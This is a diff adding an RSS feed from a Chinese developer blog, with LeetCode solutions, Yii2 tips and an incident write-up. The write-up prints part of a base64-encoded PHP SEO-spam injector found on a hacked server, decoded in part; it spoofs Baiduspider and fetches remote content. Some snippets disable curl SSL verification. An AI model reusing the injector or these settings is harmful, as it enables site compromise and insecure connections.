@@ -1,0 +1,413 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on JadenHsiao</title>
+    <link>https://jadenhsiao.gitee.io/post/</link>
+    <description>Recent content in Posts on JadenHsiao</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</copyright>
+    <lastBuildDate>Tue, 09 Aug 2022 22:15:28 +0800</lastBuildDate><atom:link href="https://jadenhsiao.gitee.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>LeetCode - （算法）最后一个单词的长度</title>
+      <link>https://jadenhsiao.gitee.io/post/length-of-last-word/</link>
+      <pubDate>Tue, 09 Aug 2022 22:15:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/length-of-last-word/</guid>
+      <description>题目链接
+给你一个字符串 s，由若干单词组成，单词前后用一些空格字符隔开。返回字符串中 最后一个 单词的长度。
+单词 是指仅由字母组成、不包含任何空格字符的最大子字符串。
+ 输入：s = &amp;ldquo;Hello World&amp;rdquo; 输出：5 解释：最后一个单词是“World”，长度为5。
+  输入：s = &amp;quot; fly me to the moon &amp;quot; 输出：4 解释：最后一个单词是“moon”，长度为4。
+  输入：s = &amp;ldquo;luffy is still joyboy&amp;rdquo; 输出：6 解释：最后一个单词是长度为6的“joyboy”。
+ class Solution {   /** * @param String $s * @return Integer */  function lengthOfLastWord($s) {  $str_length = strlen($s);  $str_start = false;  $length = 0;  for($i = $str_length-1;$i &amp;gt;= 0;$i--){  if(&amp;#39; &amp;#39;==$s[$i] &amp;amp;&amp;amp; $str_start == false){  continue;  }  if(&amp;#39; &amp;#39;==$s[$i] &amp;amp;&amp;amp; $str_start == true ){  break;  }  if(&amp;#39; &amp;#39;!</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （算法）实现 strStr()</title>
+      <link>https://jadenhsiao.gitee.io/post/implement-strstr/</link>
+      <pubDate>Sun, 07 Aug 2022 16:48:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/implement-strstr/</guid>
+      <description>题目链接
+实现 strStr() 函数。
+给你两个字符串 haystack 和 needle ，请你在 haystack 字符串中找出 needle 字符串出现的第一个位置（下标从 0 开始）。如果不存在，则返回 -1 。
+说明：
+当 needle 是空字符串时，我们应当返回什么值呢？这是一个在面试中很好的问题。
+对于本题而言，当 needle 是空字符串时我们应当返回 0 。这与 C 语言的 strstr() 以及 Java 的 indexOf() 定义相符。
+ 示例 1:
+输入：haystack = &amp;ldquo;hello&amp;rdquo;, needle = &amp;ldquo;ll&amp;rdquo; 输出：2
+  示例 2:
+输入：haystack = &amp;ldquo;aaaaa&amp;rdquo;, needle = &amp;ldquo;bba&amp;rdquo; 输出：-1
+ 代码如下：
+ class Solution {   /** * @param String $haystack * @param String $needle * @return Integer */  function strStr($haystack, $needle) {  $length = strlen($haystack);  $needle_length = strlen($needle); 	if($needle_length == 0){ 	return 0; 	}  for($i = 0;$i &amp;lt;= $length;$i++){ 	if($haystack[$i] == $needle[0]){ 	$temp_str = $haystack[$i]; 	$index = 1; 	$start_index = $i+1; 	while($index &amp;lt; $needle_length){ 	$temp_str .</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （MySQL）游戏玩法分析 I</title>
+      <link>https://jadenhsiao.gitee.io/post/game-play-analysis-i/</link>
+      <pubDate>Sun, 07 Aug 2022 13:08:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/game-play-analysis-i/</guid>
+      <description>题目链接
+使用到下面的 Activity 表，表的主键是 (player_id, event_date)。 这张表展示了一些游戏玩家在游戏平台上的行为活动。 每行数据记录了一名玩家在退出平台之前，当天使用同一台设备登录平台后打开的游戏的数目（可能是 0 个），表的结构如下：
+   Column Name Type     player_id int   device_id int   event_date date   games_played int    创建和填充数据：
+CreatetableIfNotExistsActivity(player_idint,device_idint,event_datedate,games_playedint)TruncatetableActivityinsertintoActivity(player_id,device_id,event_date,games_played)values(&amp;#39;1&amp;#39;,&amp;#39;2&amp;#39;,&amp;#39;2016-03-01&amp;#39;,&amp;#39;5&amp;#39;)insertintoActivity(player_id,device_id,event_date,games_played)values(&amp;#39;1&amp;#39;,&amp;#39;2&amp;#39;,&amp;#39;2016-05-02&amp;#39;,&amp;#39;6&amp;#39;)insertintoActivity(player_id,device_id,event_date,games_played)values(&amp;#39;2&amp;#39;,&amp;#39;3&amp;#39;,&amp;#39;2017-06-25&amp;#39;,&amp;#39;1&amp;#39;)insertintoActivity(player_id,device_id,event_date,games_played)values(&amp;#39;3&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2016-03-02&amp;#39;,&amp;#39;0&amp;#39;)insertintoActivity(player_id,device_id,event_date,games_played)values(&amp;#39;3&amp;#39;,&amp;#39;4&amp;#39;,&amp;#39;2018-07-03&amp;#39;,&amp;#39;5&amp;#39;)写一条 SQL 查询语句获取每位玩家 第一次登陆平台的日期。
+查询结果的格式如下所示：
+输入： Activity 表：
+   player_id device_id event_date games_played     1 2 2016-03-01 5   1 2 2016-05-02 6   2 3 2017-06-25 1   3 1 2016-03-02 0   3 4 2018-07-03 5    输出:</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （MySQL）连续出现的数字</title>
+      <link>https://jadenhsiao.gitee.io/post/consecutive-numbers/</link>
+      <pubDate>Sun, 07 Aug 2022 03:27:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/consecutive-numbers/</guid>
+      <description>题目链接
+使用到下面的 Logs 表，id 是这个表的主键，表的结构如下：
+   Column Name Type     id int   num varchar    创建和填充数据：
+CreatetableIfNotExistsLogs(idint,numint)TruncatetableLogsinsertintoLogs(id,num)values(&amp;#39;1&amp;#39;,&amp;#39;1&amp;#39;)insertintoLogs(id,num)values(&amp;#39;2&amp;#39;,&amp;#39;1&amp;#39;)insertintoLogs(id,num)values(&amp;#39;3&amp;#39;,&amp;#39;1&amp;#39;)insertintoLogs(id,num)values(&amp;#39;4&amp;#39;,&amp;#39;2&amp;#39;)insertintoLogs(id,num)values(&amp;#39;5&amp;#39;,&amp;#39;1&amp;#39;)insertintoLogs(id,num)values(&amp;#39;6&amp;#39;,&amp;#39;2&amp;#39;)insertintoLogs(id,num)values(&amp;#39;7&amp;#39;,&amp;#39;2&amp;#39;)编写一个 SQL 查询，查找所有至少连续出现三次的数字。
+返回的结果表中的数据可以按 任意顺序 排列。
+查询结果格式如下面的例子所示：
+输入： Person 表：
+   Id Num     1 1   2 1   3 1   4 2   5 1   6 2   7 2    输出:</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （MySQL）删除重复的电子邮箱</title>
+      <link>https://jadenhsiao.gitee.io/post/delete-duplicate-emails/</link>
+      <pubDate>Fri, 05 Aug 2022 08:27:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/delete-duplicate-emails/</guid>
+      <description>题目链接
+使用到下面的 Person 表，id 是这个表的主键，该表包含邮箱地址，表的结构如下：
+   Column Name Type     id int   email varchar    创建和填充数据：
+CreatetableIfNotExistsPerson(Idint,Emailvarchar(255))TruncatetablePersoninsertintoPerson(id,email)values(&amp;#39;1&amp;#39;,&amp;#39;john@example.com&amp;#39;)insertintoPerson(id,email)values(&amp;#39;2&amp;#39;,&amp;#39;bob@example.com&amp;#39;)insertintoPerson(id,email)values(&amp;#39;3&amp;#39;,&amp;#39;john@example.com&amp;#39;)编写一个 SQL 删除语句来 删除 所有重复的电子邮件，只保留一个id最小的唯一电子邮件。
+以 任意顺序 返回结果表。 （注意： 仅需要写删除语句，将自动对剩余结果进行查询）
+查询结果格式如下所示。
+输入： Person 表：
+   id email     1 john@example.com   2 bob@example.com   3 john@example.com    输出:
+   id email     1 john@example.</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （MySQL）上升的温度</title>
+      <link>https://jadenhsiao.gitee.io/post/rising-temperature/</link>
+      <pubDate>Wed, 03 Aug 2022 13:11:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/rising-temperature/</guid>
+      <description>题目链接
+使用到下面的 Weather 表，id 是这个表的主键，该表包含特定日期的温度信息，表的结构如下：
+   Column Name Type     id int   recordDate date   temperature int    创建和填充数据：
+CreatetableIfNotExistsWeather(idint,recordDatedate,temperatureint)TruncatetableWeatherinsertintoWeather(id,recordDate,temperature)values(&amp;#39;1&amp;#39;,&amp;#39;2015-01-01&amp;#39;,&amp;#39;10&amp;#39;)insertintoWeather(id,recordDate,temperature)values(&amp;#39;2&amp;#39;,&amp;#39;2015-01-02&amp;#39;,&amp;#39;25&amp;#39;)insertintoWeather(id,recordDate,temperature)values(&amp;#39;3&amp;#39;,&amp;#39;2015-01-03&amp;#39;,&amp;#39;20&amp;#39;)insertintoWeather(id,recordDate,temperature)values(&amp;#39;4&amp;#39;,&amp;#39;2015-01-04&amp;#39;,&amp;#39;30&amp;#39;)编写一个 SQL 查询，来查找与之前（昨天的）日期相比温度更高的所有日期的 id 。 返回结果 不要求顺序 。 查询结果格式如下例。
+输入： Weather 表：
+   id recordDate Temperature     1 2015-01-01 10   2 2015-01-02 25   3 2015-01-03 20   4 2015-01-04 30    输出：</description>
+    </item>
+    
+    <item>
+      <title>Yii2使用技巧（六）- 文件上传兼容WPS</title>
+      <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-six/</link>
+      <pubDate>Wed, 20 Jul 2022 14:00:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-six/</guid>
+      <description>在业务开发中，对于用户上传的文件需要进行安全校验，Yii本身提供了FileValidator的文件校验类；但是文件校验类对于word、excel、powerpoint的校验只是针对Microsoft，而wps的文件格式并不支持，因此需要重写文件校验类来达到我们的需求。
+ 通过断点调试，得知FileValidator是通过获取上传文件的MimeType和后缀，然后将后置通过yiisoft/yii2/helpers/mimeTypes.php中返回的数组获取到对应Yii设定的MimeType，对比是否一致，如果不一致则抛出校验错误。
+一、重写上传校验类 因此重写的思路就是在Yii进行系统判断前，我们新增WPS特殊的格式的校验，如果命中就直接返回验证通过，代码如下：
+&amp;lt;?php  namespace app\validators;  use yii\validators\FileValidator as Base; use yii\helpers\FileHelper;  class FileValidator extends Base {   protected $extra = [  &amp;#34;docx&amp;#34; =&amp;gt; &amp;#34;application/zip&amp;#34;,  &amp;#34;et&amp;#34; =&amp;gt; &amp;#34;application/vnd.ms-excel&amp;#34;,  &amp;#34;xlsx&amp;#34; =&amp;gt; &amp;#34;application/zip&amp;#34;,  &amp;#34;ett&amp;#34; =&amp;gt; &amp;#34;application/vnd.ms-excel&amp;#34;  ];   protected function validateExtension($file)  {  $extension = mb_strtolower($file-&amp;gt;extension, &amp;#39;UTF-8&amp;#39;);   if ($this-&amp;gt;checkExtensionByMimeType) {   $mimeType = FileHelper::getMimeType($file-&amp;gt;tempName, null, false);  if ($mimeType === null) {  return false;  }   $extensionsByMimeType = FileHelper::getExtensionsByMimeType($mimeType);   if($this-&amp;gt;extra[$extension] == $mimeType){  return true;  }   if (!</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （算法）独一无二的出现次数</title>
+      <link>https://jadenhsiao.gitee.io/post/unique-number-of-occurrences/</link>
+      <pubDate>Wed, 20 Jul 2022 10:11:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/unique-number-of-occurrences/</guid>
+      <description>给你一个整数数组 arr，请你帮忙统计数组中每个数的出现次数。
+如果每个数的出现次数都是独一无二的，就返回 true；否则返回 false。
+ 示例 1：
+输入：arr = [1,2,2,1,1,3] 输出：true 解释：在该数组中，1 出现了 3 次，2 出现了 2 次，3 只出现了 1 次。没有两个数的出现次数相同。
+  示例 2：
+输入：arr = [1,2] 输出：false
+  示例 3：
+输入：arr = [-3,0,1,-3,1,1,1,-3,10,0] 输出：true
+ 代码内容：
+ function uniqueOccurrences($arr) {  $result = array_count_values($arr);  if(count(array_unique($result)) == count($result)){  return true;  }  return false;  } 思路：先用array_count_values获取到数组内每一项出现的次数，再对上一步的结果进行去重，如果去重结果和上一步的结果数量一致，则每一项出现次数都是独一无二。</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （算法）两数之和</title>
+      <link>https://jadenhsiao.gitee.io/post/two-sum/</link>
+      <pubDate>Wed, 20 Jul 2022 10:11:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/two-sum/</guid>
+      <description>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。
+你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。
+ 示例:
+给定 nums = [2, 7, 11, 15], target = 9 因为 nums[0] + nums[1] = 2 + 7 = 9 所以返回 [0, 1]
+ 代码内容：
+ class Solution {   /** * @param Integer[] $nums * @param Integer $target * @return Integer[] */  function twoSum($nums, $target) {  $res = [];  for($i = 0;$i &amp;lt; count($nums);$i++){  foreach($nums as $item=&amp;gt;$value){  if($nums[$i] + $nums[$item] == $target &amp;amp;&amp;amp; $i!</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （算法）搜索插入位置</title>
+      <link>https://jadenhsiao.gitee.io/post/search-insert-position/</link>
+      <pubDate>Wed, 20 Jul 2022 10:11:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/search-insert-position/</guid>
+      <description>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。
+你可以假设数组中无重复元素。
+ 示例 1:
+输入: [1,3,5,6], 5 输出: 2
+  示例 2:
+输入: [1,3,5,6], 7 输出: 4
+  示例 3:
+输入: [0,3,5,6], 0 输出: 0
+ 代码内容：
+ class Solution {   /** * @param Integer[] $nums * @param Integer $target * @return Integer */  function searchInsert($nums, $target) {  if(in_array($target,$nums)){  $result = array_search($target,$nums);  return $result;  }else{  if(min($nums)&amp;gt;$target){  return 0;  }  if(max($nums)&amp;lt;$target){  return count($nums);  }  for($i=0;$i&amp;lt;count($nums);$i++){  if($nums[$i]&amp;lt;$target &amp;amp;&amp;amp; $nums[$i+1]&amp;gt;$target){  return $i+1;  }  }  }  }  } 思路：本题主要是位置查找问题，如果在数组内就返回对应的下标，比最小值的小就返回第一个值的下标，比最大值的大就返回最大值插入的位置，否则就返回插入的位置，因此，先跟最小的比较，再跟最大的比较，如果都不成立就走遍历，从遍历里当前的和往前一位的比较，如果在中间就直接取前一位的位置。</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （算法）整数反转</title>
+      <link>https://jadenhsiao.gitee.io/post/reverse-integer/</link>
+      <pubDate>Wed, 20 Jul 2022 10:11:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/reverse-integer/</guid>
+      <description>给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。
+ 示例 1:
+输入: 123 输出: 321
+  示例 2:
+输入: -123 输出: -321
+  示例 3:
+输入: 120 输出: 21
+ 注意:
+假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−231, 231 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。 代码内容：
+ class Solution {   /** * @param Integer $x * @return Integer */  function reverse($x) {  $b = $x;  if($x&amp;lt;0){  $x = $x*-1;  }  if($b == 0){  return $b;  }  $result = implode(array_reverse(str_split($x)));  $t = trim($result,0);  if($t&amp;gt;pow(2,31)){  return 0;  }  return $b&amp;lt;0?</description>
+    </item>
+    
+    <item>
+      <title>LeetCode - （算法）最大间距</title>
+      <link>https://jadenhsiao.gitee.io/post/maximum-gap/</link>
+      <pubDate>Wed, 20 Jul 2022 10:11:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/maximum-gap/</guid>
+      <description>给定一个无序的数组，找出数组在排序之后，相邻元素之间最大的差值。
+如果数组元素个数小于 2，则返回 0。
+ 示例 1:
+输入: [3,6,9,1] 输出: 3 解释: 排序后的数组是 [1,3,6,9], 其中相邻元素 (3,6) 和 (6,9) 之间都存在最大差值 3。
+  示例 2:
+输入: [10] 输出: 0 解释: 数组元素个数小于 2，因此返回 0。
+ 代码如下：
+ function maximumGap($nums) {  sort($nums);  if(count($nums) == 1 || empty($nums)){  return 0;  }  else{  $total = [];  foreach($nums as $a=&amp;gt;$v){  if($a != count($nums)-1){  $total[] = $nums[$a+1]-$v;  }  }  unset($v);  return max($total);  }  } 思路：先将参数数组进行排序，然后判断个数如果为1和0就直接返回最大值0，否则将数组每一项和前一项进行比对，放入到result，最后使用max获取到最大值。</description>
+    </item>
+    
+    <item>
+      <title>Yii2使用技巧（五）- 使用Sentry作为错误日志监控平台</title>
+      <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-five/</link>
+      <pubDate>Tue, 19 Jul 2022 15:29:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-five/</guid>
+      <description>Sentry 是一个实时的事件日志和聚合平台，基于 Django 构建。使用它可以帮助我们记录下错误信息，官方提供的phpSDK,只需几行代码，就可以把他整合到Yii中，本篇文章是技巧三的延续。
+ 一、注册Sentry账号 Sentry官方提供了线上版和docker部署两种方式，这里使用的是线上版，有兴趣独立部署的点击前往github项目主页查看； 打开Sentry注册页面，填写对应公司信息和个人信息、邮箱、密码，该邮箱将会作为管理员邮箱。
+二、创建项目 注册完成后进入到控制台，点击右上角进入创建项目界面；
+因为我们要在Yii中使用，所以选择php，填写项目名称，点击创建。
+创建完成后，在引导配置界面有我们等下需要用到的dsn，将其复制下来保存好。
+三、整合到Yii中   使用composer安装sentry/sdk，指令如下composer require sentry/sdk --with-all-dependencies；由于该包要求php版本不能低于8.0，所以要先对php环境配置好。
+  将dsn设置到Yii的params中，在config/params.php的数组中加入以下代码块：
+  &amp;lt;?php  return [  &amp;#39;adminEmail&amp;#39; =&amp;gt; &amp;#39;admin@example.com&amp;#39;,  &amp;#39;senderEmail&amp;#39; =&amp;gt; &amp;#39;noreply@example.com&amp;#39;,  &amp;#39;senderName&amp;#39; =&amp;gt; &amp;#39;Example.com mailer&amp;#39;,  &amp;#39;dsn&amp;#39; =&amp;gt; &amp;#39;https://764e44dc5a984331bbe928d1f201fba8@o1261582.ingest.sentry.io/6439472&amp;#39; ]; 在模块的入口文件init方法加入sentry初始化相关，代码块如下：  &amp;lt;?php use function Sentry\init as sentry_init;  class Module extends \yii\base\Module{  public function init(){  parent::init();  sentry_init([&amp;#39;dsn&amp;#39; =&amp;gt; Yii::$app-&amp;gt;params[&amp;#39;dsn&amp;#39;] ]);  } } 在错误拦截类中加入提交到Sentry相关  &amp;lt;?</description>
+    </item>
+    
+    <item>
+      <title>Yii2使用技巧（四）- 将Yii整合到GatewayWorker</title>
+      <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-four/</link>
+      <pubDate>Mon, 18 Jul 2022 15:29:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-four/</guid>
+      <description> Yii作为FPM框架，主要针对业务开发方面，因为本身并不支持网络层面编程，所以需要引入其他网络框架，这里我选择的是基于WorkerMan的GatewayWorker，来处理业务里需要的WebSocket；但是我又想在GatewayWorker中使用Yii的例如Active Record、ArrayHelper等上手的特性，所以本篇文章将对于如何整个进行说明。
+ 一、下载GatewayWorker 这里提供了下载GatewayWorker的链接地址，下载后，将压缩包的内容解压到Yii2的项目目录内。
+二、修改start_businessworker.php  BusinessWorker类其实也是基于基础的Worker开发的。BusinessWorker是运行业务逻辑的进程，BusinessWorker收到Gateway转发来的事件及请求时会默认调用Events.php中的onConnect onMessage onClose方法处理事件及数据，开发者正是通过实现这些回调控制业务及流程。
+ 上述这段引用是WorkerMan对于该生命周期中，业务逻辑处理所在位置的说明；所以Yii的操作就在这个环节上；打开Applications目录，修改start_businessworker.php，加入以下代码块：
+&amp;lt;?php  //...  require_once __DIR__ . &amp;#39;/../../vendor/autoload.php&amp;#39;;  defined(&amp;#39;YII_DEBUG&amp;#39;) or define(&amp;#39;YII_DEBUG&amp;#39;, true); defined(&amp;#39;YII_ENV&amp;#39;) or define(&amp;#39;YII_ENV&amp;#39;, &amp;#39;dev&amp;#39;);  $config = require(__DIR__ . &amp;#39;/../../config/web-socket.php&amp;#39;); require(__DIR__ . &amp;#39;/../../vendor/yiisoft/yii2/Yii.php&amp;#39;);  (new \yii\web\Application($config))-&amp;gt;run();  if(!defined(&amp;#39;GLOBAL_START&amp;#39;)) {  Worker::runAll(); } 在Worker::runAll()，前面先引用composer的自加载，然后$config可以自己定义配置文件，再引入Yii的核心文件，最后一步将其实例化即可，其实这个流程就和Yii框架本身public/index.php是一致的。
+三、用Yii的编码风格编写GatewayWorker的业务代码 在Applications目录下的Events.php中就可以愉快使用原先框架的模型文件进行增删改查，工具类函数进行数组操作了。
+注意：引用类时需要使用完全限定名称，例如use \app\models\Example;
+参考链接  在第三方系统内使用 Yii 命名空间和动态语言特征 GatewayWorker  </description>
+    </item>
+    
+    <item>
+      <title>Yii2使用技巧（三）- 优雅处理业务错误</title>
+      <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-three/</link>
+      <pubDate>Mon, 18 Jul 2022 09:50:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-three/</guid>
+      <description>错误提示是程序运行重要的一环，可以让开发者及时知晓出错的位置和原因，但是在编码的时候，因拦截错误所编写的大量try catch会让代码后期难以维护，所以这里将会针对Yii，对程序的错误提示进行统一处理。
+ 一、准备错误码类 在对应的模块目录下先创建一个exception的目录，用于放置我们处理错误的逻辑内容；在该目录下创建一个名为ErrorCodes.php的文件，该文件主要是放置错误码列表，一些通用的错误将通过该列表获取返回；代码如下：
+&amp;lt;?php namespace app\modules\example\exception;  class ErrorCodes {   /** * 错误码列表 * @return array */  public static function errorCodeList()  {   return [   401 =&amp;gt; &amp;#34;Access Token 无效&amp;#34;,  403 =&amp;gt; &amp;#34;该 App ID 已被封禁，请联系管理员&amp;#34;,  429 =&amp;gt; &amp;#34;请求次数过多，请稍后再试&amp;#34;,  500 =&amp;gt; &amp;#34;服务器内容错误&amp;#34;,   // TODO 其他的错误信息可以根据错误码内容写入  101001 =&amp;gt; &amp;#34;生成 Access Token 失败&amp;#34;,   ];   }  } 上面的代码里放置了几个比较通用的错误码和提示语，这里可以根据业务需求进行自定义。</description>
+    </item>
+    
+    <item>
+      <title>记录一次清理网站挂马</title>
+      <link>https://jadenhsiao.gitee.io/post/clear-website-trojan/</link>
+      <pubDate>Sat, 28 May 2022 10:54:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/clear-website-trojan/</guid>
+      <description>某一天，上班上到一半，老板拿着某度APP，过来技术部，跟我们说，公司网站被挂马了，上面全部是菠菜广告；听到老板反馈后，立马开始排查，但是使用普通浏览器访问又看不到内容；于是乎就有下面清理历程了。
+ 问题一：只有某度APP打开才复现问题？ 很明显就是针对于某度，因为某度会对站点进行爬取收录（这方面涉及到了SEO相关），而且从挂马内容看都是搜索热词；直接浏览器打开看不到内容，具有隐秘性；对此，我找了个某度爬虫的请求头，然后使用chrome的一款可以修改请求头的拓展 ModHeader，来看下能不能复现内容。
+上面这张图就是使用 ModHeader，把请求的 User-Agent 修改为某度的爬虫请求头，然后请求被挂马的站点，发现问题复现了，下面的文本就是某度的 UA 请求头。
+Mozilla/5.0 (compatible; **iduspider2; +http://www.**idu.com/search/spider.html) 问题二：内容动态变化，而且源码找不到网络请求？ 专门从服务器把代码下载下来，翻箱倒柜的找代码，任何涉及到有http请求的都不放过，可是，就是没找到内容。这就纳闷了；找源码无果后，尝试在项目的目录下新建了个再普通不过的php脚本，内容就输出打印，然后die掉。 结果发现还是输出了挂马内容，很明显，这已经不是项目代码的问题了，是php-fpm的问题了。
+然后没过多久，老板打电话来说，同一台服务器的网站也出现同样的情况了，然后上去看了下，都是用着上古php5.6，就更加证明上面的推测是正确的。
+问题三：没有文件，到底是在哪里注入？ 既然没有文件，而且又有网络请求，而且这么多网站都有，那么必定会引起网络IO堵塞，所以就想到了服务器上的php是开启了慢日志的，然后翻了下慢日志，果不其然，找到了这段因为可疑的base64字符串（部分内容涉及到菠菜的已经被我删掉了）。
+data:;base64,PD9waHAKQG9iX3N0YXJ0ICgpOwpAc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CiR0ciA9ICJzdHJpc3RyIjsKJGVyID0gJF9TRVJWRVI7CmZ1bmN0aW9uIGh0dHBHZXRsYWkoJHVybCkgewogICAgJGNoID0gY3VybF9pbml0KCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICdNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgQmFpZHVzcGlkZXIvMi4wOyAraHR0cDovL3d3dy5iYWlkdS5jb20vc2VhcmNoL3NwaWRlci5odG1sKScpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBGQUxTRSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIEZBTFNFKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwg 看到base64字符串，立马对字符串进行转码，果不其然，发现了http请求的代码。
+&amp;lt;?php@ob_start ();@set_time_limit(0);error_reporting(0);header(&amp;quot;Content-Type: text/html;charset=utf-8&amp;quot;);$tr = &amp;quot;stristr&amp;quot;;$er = $_SERVER;function httpGetlai($url) {$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&#39;);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);$output = curl_exec($ch);curl_close($ch);return $output;}define(&#39;url&#39;, $er[&#39;REQUEST_URI&#39;]);@define(&#39;ref&#39;, $er[&#39;HTTP_REFERER&#39;]);define(&#39;ent&#39;, $er[&#39;HTTP_USER_AGENT&#39;]);define(&#39;site&#39;, &amp;quot;http://www.</description>
+    </item>
+    
+    <item>
+      <title>微信开发技巧之文件上传</title>
+      <link>https://jadenhsiao.gitee.io/post/upload-asset-to-wechat/</link>
+      <pubDate>Sat, 16 Apr 2022 00:26:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/upload-asset-to-wechat/</guid>
+      <description>微信小程序直播提供了由服务端发起创建直播间的功能，然而其中包括直播间的封面图和分享海报，官方文档的指引是通过临时素材的 media_id 来访问文件的，该接口请求方式为 http 的 POST/FORM ，即用 FORM 表单来上传一个多媒体文件，这里使用的是 php 的 Curl 请求工具类发起网络请求，用 CURLFile 封装表单的多媒体文件。
+ 下面是我在项目开发时使用的代码片段，第一部分是发送网络请求的工具函数：
+public function httpUploadFile( $url,$data ) { 	$ch = curl_init();   curl_setopt($ch, CURLOPT_URL, $url);  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  curl_setopt($ch, CURLOPT_POST, 1);  curl_setopt($ch, CURLOPT_POST, 1);  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  curl_setopt(  $ch,  CURLOPT_POSTFIELDS,  $data  );  $headers = array();  $headers[] = &amp;#39;Content-Type: multipart/form-data&amp;#39;;  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);   $output = curl_exec($ch);  curl_close($ch);  return $output; } 上面的代码片段其实是和普通的 Curl 发起 POST 是无差别的；需要注意的是，发送前，需要设置请求头为 &#39;Content-Type: multipart/form-data&#39; 。</description>
+    </item>
+    
+    <item>
+      <title>Yii2使用技巧（二）- 在Yii上使用MongoDB</title>
+      <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-two/</link>
+      <pubDate>Mon, 21 Mar 2022 00:26:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-two/</guid>
+      <description>公司项目的主线业务使用的是 MySQL ，但是在日志系统使用的是非关系型数据库 MongoDB ，而 Yii2 本身的 Active Record 是支持的，所以使用技巧二将针对 Yii2 上 MongoDB 的使用方法做一系列讲解。
+ 一、下载安装 Yii2-mongodb 拓展包 根据拓展的简介，这个拓展包的功能就是作为 Yii2 和 mongoDB 的粘合剂，因此这个拓展包是必要的；在 Yii2 项目目录下，执行 composer require yiisoft/yii2-mongodb ；或者在项目的“ composer.json ”文件中“ require ”项内加入 &amp;quot;yiisoft/yii2-mongodb&amp;quot;: &amp;quot;~2.1.0&amp;quot; ，再执行 composer update ，将拓展包安装包项目内。
+二、将组件添加到 Yii 配置 因为本人使用的是 basic 版，所以就直接在项目的 config/web.php 文件的 components 关联数组内添加一下代码：
